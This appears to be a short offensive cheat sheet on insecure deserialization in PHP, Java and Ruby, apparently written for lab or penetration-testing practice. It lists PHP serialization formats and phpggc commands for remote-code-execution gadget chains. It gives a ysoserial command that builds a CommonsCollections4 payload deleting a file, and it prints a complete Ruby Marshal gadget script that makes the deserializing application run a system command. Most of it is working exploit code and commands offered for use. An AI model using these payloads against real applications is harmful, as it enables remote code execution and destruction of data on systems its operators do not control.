# PHP

Possible types
```
Null	            N;
Boolean	            b:1;b:0;
Integer	            i:685230;i:-685230;
Floating point	    d:685230.15;d:INF;d:-INF;d:NAN;
String	            s:5:"apple";s:6:"A to Z";
Associative array	a:2:{i:42;b:1;s:6:"A to Z";a:3:{i:0;i:1;i:1;i:2;i:2;i:3;}}
Object	            O:8:"stdClass":2:{s:4:"John";d:3.14;s:4:"Jane";d:2.718;}
```

### Gadget Chains

https://github.com/ambionics/phpggc

List
```sh
./phpggc -l
```

Filter
```sh
./phpggc -l laravel
```

Details
```sh
./phpggc -i symfony/rce1
Name           : Symfony/RCE1
Version        : 3.3
Type           : rce
Vector         : __destruct
Informations   : 
Exec through proc_open()

./phpggc Symfony/RCE1 <command>
```


# Java

Gadget Chains

https://github.com/frohoff/ysoserial

```sh
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar  CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 
```


# Ruby

Universal Deserialisation Gadget for Ruby 2.x-3.x

payload_gen.rb

```ruby
require 'net/http'
require 'rubygems'
require 'base64'
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
# puts Base64.encode64(payload)
```
